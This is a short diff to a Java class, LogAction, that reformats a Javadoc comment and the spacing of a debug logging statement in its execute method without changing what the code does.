@@ -26,9 +26,8 @@ public class LogAction extends SubAction {
 
 	/**
 	 * Instantiates a new log action.
-	 * 
-	 * @param params
-	 *            the conf params
+	 *
+	 * @param params the conf params
 	 */
 	public LogAction(final ConfAction params) {
 		super(params);
@@ -41,8 +40,8 @@ public class LogAction extends SubAction {
 	 */
 	@Override
 	public boolean execute(Trigger trigger) {
-		if(Cfg.DEBUG){
-			Check.log(TAG + " (LogAction) logging: "+ msg);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (LogAction) logging: " + msg);
 		}
 		EvidenceBuilder.info(msg);
 
